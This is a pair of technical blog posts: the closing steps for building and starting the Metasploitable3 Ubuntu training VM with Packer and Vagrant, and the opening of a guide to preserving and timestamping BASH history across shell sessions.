&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ wget https://releases.hashicorp.com/packer/1.2.4/packer_1.2.4_linux_amd64.zip&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Unzip the file. Note the &lt;code class=&quot;language-text&quot;&gt;unzip&lt;/code&gt; tool is provided by default in Ubuntu Desktop 18.04 but has not been in the past. If the following command does not work, make sure to install the &lt;code class=&quot;language-text&quot;&gt;unzip&lt;/code&gt; utility using: &lt;code class=&quot;language-text&quot;&gt;sudo apt install unzip&lt;/code&gt;. Not extract the zip archive:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ unzip packer_1.2.4_linux_amd64.zip&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The archive only contains one file, named &lt;code class=&quot;language-text&quot;&gt;packer&lt;/code&gt;. We need to make this binary file available. You could add a path, but that is a little more work, so we are going to move the &lt;code class=&quot;language-text&quot;&gt;packer&lt;/code&gt; binary file to the &lt;code class=&quot;language-text&quot;&gt;/usr/local/bin/&lt;/code&gt; directory. Basically, this means that we can run, or execute, the &lt;code class=&quot;language-text&quot;&gt;packer&lt;/code&gt; command from any location in the file system. Move the executable file using the command below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ mv packer /usr/local/bin/packer&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you ever want to remove the file in the future, just delete the file using: &lt;code class=&quot;language-text&quot;&gt;sudo rm /usr/local/bin/packer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Check that packer works and is the correct version using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ packer version
Packer v1.2.4&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;installing-packer-vagrant-reload-plugin&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#installing-packer-vagrant-reload-plugin&quot; aria-label=&quot;installing packer vagrant reload plugin permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing Packer Vagrant Reload Plugin&lt;/h4&gt;
&lt;p&gt;The fourth, and final requirement is a Vagrant plugin named &lt;a href=&quot;https://github.com/aidanns/vagrant-reload&quot;&gt;vagrant-reload&lt;/a&gt;. This plugin allows a reload during virtual machine provisioning. The Metasploitable3 build requires this plugin, so we must install it. Luckily, the installation is straightforward. Execute the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:/tmp$ vagrant plugin install vagrant-reload
Installing the &apos;vagrant-reload&apos; plugin. This can take a few minutes...
Fetching: vagrant-reload-0.0.1.gem (100%)
Installed the plugin &apos;vagrant-reload (0.0.1)&apos;!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Done!&lt;/p&gt;
&lt;h3 id=&quot;building-metasploitable3-linux-version&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#building-metasploitable3-linux-version&quot; aria-label=&quot;building metasploitable3 linux version permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building Metasploitable3 Linux Version&lt;/h3&gt;
&lt;p&gt;In the previous section, we install all application requirements including VirtualBox, Vagrant, vagrant-reload, and packer. We are now ready to actually build Metasploitable3! &lt;/p&gt;
&lt;p&gt;This tutorial specifies the home directory to download the GitHub repository and build the project. However, you can perform these steps in another location. It shouldn’t make a difference, as none of the commands specify a full path.&lt;/p&gt;
&lt;p&gt;Go back to your home directory, or somewhere you want to build the project:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure you have &lt;code class=&quot;language-text&quot;&gt;git&lt;/code&gt; installed. This is required to download the source code of the Metasploitable3 project from GitHub. Use &lt;code class=&quot;language-text&quot;&gt;apt&lt;/code&gt; to install &lt;code class=&quot;language-text&quot;&gt;git&lt;/code&gt; if you do not already have it installed:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Clone the Metasploitable3 GitHub repository:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git clone https://github.com/rapid7/metasploitable3.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is approximately 175MB, so be patient! Now, change directory to the downloaded Metasploitable3 source code:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd metasploitable3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;BUG FIX&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This step is very important. When building Metasploitable3 for this tutorial, I found a bug in the configuration for one of the flags… specifically, the &lt;code class=&quot;language-text&quot;&gt;7_of_diamonds&lt;/code&gt; flag. If the following bug fix is not implemented, your build will fail!&lt;/p&gt;
&lt;p&gt;Open the &lt;code class=&quot;language-text&quot;&gt;flags.rb&lt;/code&gt; file, where the configuration for the system flags is performed.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim chef/cookbooks/metasploitable/recipes/flags.rb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Locate line 38. Basically, we need to change one of the lines which have an error. The specific flag is the &lt;code class=&quot;language-text&quot;&gt;7_of_diamonds&lt;/code&gt;, and the docker image that is built for this flag refers to an incorrect name. In the code, it is specified as &lt;code class=&quot;language-text&quot;&gt;7 of diamonds&lt;/code&gt;, while it should be &lt;code class=&quot;language-text&quot;&gt;7_of_diamonds&lt;/code&gt;. The original code is listed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;bash &apos;build docker image for 7 of diamonds&apos; do
  code &lt;&lt;-EOH
    cd /opt/docker
    docker build -t &quot;7_of_diamonds&quot; .
    docker run -dit --restart always --name 7_of_diamonds 7_of_diamonds
  EOH
end&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure to change the code to the following listing (note the added underscore character to the first line!):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;bash &apos;build docker image for 7_of_diamonds&apos; do
  code &lt;&lt;-EOH
    cd /opt/docker
    docker build -t &quot;7_of_diamonds&quot; .
    docker run -dit --restart always --name 7_of_diamonds 7_of_diamonds
  EOH
end&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;OK! We are ready to start the build process. Run the build script using &lt;code class=&quot;language-text&quot;&gt;ubuntu1404&lt;/code&gt; as an argument to the script. This will specify that we want to build the Linux version, not the Windows Server 2008 version:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;./build.sh ubuntu1404&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Get a coffee, do the dishes or find something else to do for the next 30 to 45 minutes. The build process takes quite a while, but due to the automated tools used (Vagrant and Packer), it requires no intervention from the user. &lt;/p&gt;
&lt;p&gt;When finished you will see output that is similar to the code snippet below. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;==&gt; Builds finished. The artifacts of successful builds are:
--&gt; virtualbox-iso: &apos;virtualbox&apos; provider box: /home/thomasl/metasploitable3/packer/templates/../builds/ubuntu_1404_virtualbox_0.1.12.box
Box successfully built by Packer.
Attempting to add the box to Vagrant...
==&gt; box: Box file was not detected as metadata. Adding it directly...
==&gt; box: Adding box &apos;metasploitable3-ub1404&apos; (v0) for provider:
    box: Unpacking necessary files from: file:///home/thomasl/metasploitable3/packer/builds/ubuntu_1404_virtualbox_0.1.12.box
==&gt; box: Successfully added box &apos;metasploitable3-ub1404&apos; (v0) for &apos;virtualbox&apos;!
Box successfully added to Vagrant.
---------------------------------------------------------------------
SUCCESS: Run &apos;vagrant up&apos; to provision and start metasploitable3.
NOTE: The VM will need Internet access to provision properly.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The specific build will complete, resulting in a &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file. According to &lt;a href=&quot;https://www.vagrantup.com/docs/boxes/format.html&quot;&gt;HashiCorp&lt;/a&gt;, a &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file is is a compressed (&lt;code class=&quot;language-text&quot;&gt;tar&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;tar.gz&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;zip&lt;/code&gt;) file that is specific to a single provider (e.g., VirtualBox or VMWare) and can contain anything. In the case of Metasploitable3, it is the virtual machine that we just built. You can find the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file in the &lt;code class=&quot;language-text&quot;&gt;metasploitable3/packer/builds/&lt;/code&gt; directory. &lt;/p&gt;
&lt;p&gt;To start the virtual machine, essentially exporting it to VirtualBox, run the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vagrant up&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will export the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file to VirtualBox. More specifically, we should probably run:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vagrant up ub1404&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;vagrant up&lt;/code&gt; command looks the &lt;code class=&quot;language-text&quot;&gt;.Vagrantfile&lt;/code&gt; in the base directory of the Metasploitable3 source code. If we have a look at the code in this file, we can see that running &lt;code class=&quot;language-text&quot;&gt;vagrant up&lt;/code&gt; will try to export both types of virtual machines (Ubuntu Linux and Widnows Server 2008). The Linux-specific part of the &lt;code class=&quot;language-text&quot;&gt;.Vagrantfile&lt;/code&gt; is displayed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Vagrant.configure(&quot;2&quot;) do |config|
  config.vm.define &quot;ub1404&quot; do |ub1404|
    ub1404.vm.box = &quot;metasploitable3-ub1404&quot;
    ub1404.vm.hostname = &quot;metasploitable3-ub1404&quot;
    config.ssh.username = &apos;vagrant&apos;
    config.ssh.password = &apos;vagrant&apos;

    ub1404.vm.network &quot;private_network&quot;, ip: &apos;172.28.128.3&apos;

    ub1404.vm.provider &quot;virtualbox&quot; do |v|
      v.name = &quot;Metasploitable3-ub1404&quot;
      v.memory = 2048
    end
  end

  config.vm.define &quot;win2k8&quot; do |win2k8|
    # Base configuration for the VM and provisioner
    win2k8.vm.box = &quot;metasploitable3-win2k8&quot;
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you can see, there are two configurations for each type of virtual machine. The &lt;code class=&quot;language-text&quot;&gt;ub1404&lt;/code&gt; configuration is for the virtual machine we just built. We can see some interesting configuration options including the name of the &lt;code class=&quot;language-text&quot;&gt;.box&lt;/code&gt; file (&lt;code class=&quot;language-text&quot;&gt;metasploitable3-ub1404&lt;/code&gt;), the hostname (&lt;code class=&quot;language-text&quot;&gt;metasploitable3-ub1404&lt;/code&gt;), the username and password (&lt;code class=&quot;language-text&quot;&gt;vagrant/vagrant&lt;/code&gt;), the IP address of the virtual machine (&lt;code class=&quot;language-text&quot;&gt;172.28.128.3&lt;/code&gt;), the name of the virtual machine (&lt;code class=&quot;language-text&quot;&gt;Metasploitable3-ub1404&lt;/code&gt;) and RAM allocation (&lt;code class=&quot;language-text&quot;&gt;2048&lt;/code&gt;). You can edit these values to change any configuration when the virtual machine is exported, or you can change these values through VirtualBox as well.&lt;/p&gt;
&lt;p&gt;After running &lt;code class=&quot;language-text&quot;&gt;vagrant up&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;vagrant up ub1404&lt;/code&gt;, the virtual machine will be exported and become available in VirtualBox. You can open the VirtualBox application and see that the &lt;code class=&quot;language-text&quot;&gt;Metasploitable3-ub1404&lt;/code&gt; virtual machine is running and available for use. Like previously mentioned, you can now easily customize the virtual machine using the VirtualBox application; for example, modify the network adapter configuration. &lt;/p&gt;
&lt;p&gt;Hopefully, this tutorial got a Metasploitable3 Ubuntu Linux version virtual machine up and running. The platform is excellent for testing and learning in a virtualized environment. Stay tuned for my next Metasploitable3 tutorial, customizing Metasploitable3 Ubuntu Linux version, where we will look at how to customize the vulnerabilities, users, and flags for the virtual machine we build today.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Better Bash History]]></title><description><![CDATA[Contents Introduction How to Save All BASH History Additional BASH History Configuration BASH Configuration Overview A BASH Script to…]]></description><link>https://thomaslaurenson.com/blog/2018-07-02/better-bash-history/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-02/better-bash-history/</guid><pubDate>Mon, 02 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-to-save-all-bash-history&quot;&gt;How to Save All BASH History&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#additional-bash-history-configuration&quot;&gt;Additional BASH History Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bash-configuration-overview&quot;&gt;BASH Configuration Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#a-bash-script-to-configure-enhanced-bash-history&quot;&gt;A BASH Script to Configure Enhanced BASH History&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;It is my continual venture to make my job easier. Like my sysadmin roots taught me, try to automate the process, and document thoroughly. In my job as a lecturer, I try to automate many aspects of the courses I run. Even though it takes time up front… next semester will be easier!&lt;/p&gt;
&lt;p&gt;I learned a lesson about using VMs for tertiary assessments early on. The more information about what has been performed on a system, the easier (and sometimes faster) it is to assess the tasks performed. For example, in the Linux and Security paper, I teach it is very useful to see the complete BASH command history. After my first semester of teaching, I noticed the bash history was somewhat limited in a collection of assignment VMs. It turned out that most of the history was not being retained, due to students having multiple sessions (SSH, TTYs etc.). This needed to be solved. If there is a rich history, it will be better for me (marking) and better for them (reviewing their own command history). The goals:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Implement a solution to preserve BASH history in multiple sessions&lt;/li&gt;
&lt;li&gt;Add a timestamp to each command stored&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first problem was determining why BASH was not maintaining a complete history. A quick Google and some research discovered. Apparently, each open terminal (SSH session etc.) has an independent history file buffer. This file is known as the &lt;code class=&quot;language-text&quot;&gt;.bash_history&lt;/code&gt; file, a hidden file in the home directory of each user. It has the environment variable of &lt;code class=&quot;language-text&quot;&gt;$HISTFILE&lt;/code&gt;. For example: &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ echo $HISTFILE
/home/thomasl/.bash_history&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Back to the problem: previously entered commands are stored in &lt;code class=&quot;language-text&quot;&gt;$HISTFILE&lt;/code&gt; when the terminal is closed. If you wanted to search for a specific command, for example, &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt;, you would run the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;history | grep iptables&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, if any &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; command was run in a different shell or session, it is not visible in the current session. To see the full command history you would need to close all shells, open a new shell and run the history command again! In addition, if a shell is not exited cleanly, no history will be saved. According to the &lt;a href=&quot;https://www.gnu.org/software/bash/manual/html_node/Bash-History-Facilities.html&quot;&gt;Bash History Facilities&lt;/a&gt; man page from GNU, the history is not saved if the terminal is not exited cleanly. An example of this is closing a PuTTY session by using &lt;code class=&quot;language-text&quot;&gt;Ctrl + F4&lt;/code&gt; or closing the window using the &lt;code class=&quot;language-text&quot;&gt;X&lt;/code&gt; button, instead of typing &lt;code class=&quot;language-text&quot;&gt;exit&lt;/code&gt; in the shell itself. Unfortunately, I see students doing this regularly. I shouldn’t kid myself, even I do this occasionally!&lt;/p&gt;
&lt;h2 id=&quot;how-to-save-all-bash-history&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-save-all-bash-history&quot; aria-label=&quot;how to save all bash history permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to Save All BASH History&lt;/h2&gt;
&lt;p&gt;This section discusses each command found to be useful to preserve all BASH commands in the history file. The full script for enhancing BASH history is provided at the end of the article.&lt;/p&gt;
&lt;p&gt;To prevent loss of command history, it is possible to append to the history file instead of overwriting previous content from each session. This is configurable using the &lt;code class=&quot;language-text&quot;&gt;histappend&lt;/code&gt; shell option, as illustrated below. Please note that the &lt;code class=&quot;language-text&quot;&gt;shopt&lt;/code&gt; command is a shell builtin to set and unset (enable and disable) various Bash shell options:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Configure BASH to append (rather than overwrite the history):
shopt -s histappend&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The next configuration specifies that there is an attempt to save each line of a multi-line command in the same history entry. This would add semicolons where necessary to preserve the syntactic correctness of the original command. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Attempt to save all lines of a multiple-line command in the same entry
shopt -s cmdhist&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The final major setting is to configure the history file to reload after every entry. This means that we can append after every executed command, rather than when a shell session is exited. To achieve this, the &lt;code class=&quot;language-text&quot;&gt;PROMPT_COMMAND&lt;/code&gt; setting can be leveraged. Any value specified for the &lt;code class=&quot;language-text&quot;&gt;PROMPT_COMMAND&lt;/code&gt; is executed as a command prior to issuing each primary prompt. We will leverage it to reload the BASH history.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# After each command, append to the history file and reread it
export PROMPT_COMMAND=&quot;${PROMPT_COMMAND:+$PROMPT_COMMAND$&quot;\n&quot;}history -a; history -c; history -r&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A brief summary of the &lt;code class=&quot;language-text&quot;&gt;history&lt;/code&gt; commands:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;history -a&lt;/code&gt;: Append to the history file&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;history -c&lt;/code&gt;: Clear the history (of the current shell)&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;history -r&lt;/code&gt;: Read the history file and append its contents to the history list&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As you can see, these series of command basically append, clear and reload the contents of the &lt;code class=&quot;language-text&quot;&gt;.bash_history&lt;/code&gt; file. It is essential to clear the file as if this was not performed… there would be duplicate history entries when the shell session was exited!&lt;/p&gt;
&lt;p&gt;The three specified commands and configuration (&lt;code class=&quot;language-text&quot;&gt;histappend&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;cmdhist&lt;/code&gt;, and &lt;code class=&quot;language-text&quot;&gt;PROMPT_COMMAND&lt;/code&gt;) provide the functionality to save all BASH history as soon as it is entered. Excellent!&lt;/p&gt;
&lt;h2 id=&quot;additional-bash-history-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#additional-bash-history-configuration&quot; aria-label=&quot;additional bash history configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Additional BASH History Configuration&lt;/h2&gt;
&lt;p&gt;The previous discussion specified a robust configuration for saving all BASH command history. However, there are some additional configurations that are also useful.&lt;/p&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;HISTTIMEFORMAT&lt;/code&gt; variable allows the inclusion of a timestamp on each command entry in the history file. It uses the same format string method as the &lt;a href=&quot;https://linux.die.net/man/3/strftime&quot;&gt;strftime&lt;/a&gt; command. I prefer the following configuration:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# Print the timestamp of each command
HISTTIMEFORMAT=&apos;%F %T &apos;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which results in the following timestamp: &lt;code class=&quot;language-text&quot;&gt;%Y-%m-%d %H:%M:%S&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;For example: &lt;code class=&quot;language-text&quot;&gt;2018-05-17 19:24:05&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;However, you could use any type of configuration you like. The &lt;a href=&quot;https://linux.die.net/man/3/strftime&quot;&gt;strftime man page&lt;/a&gt; has a complete summary of how to use the command.&lt;/p&gt;
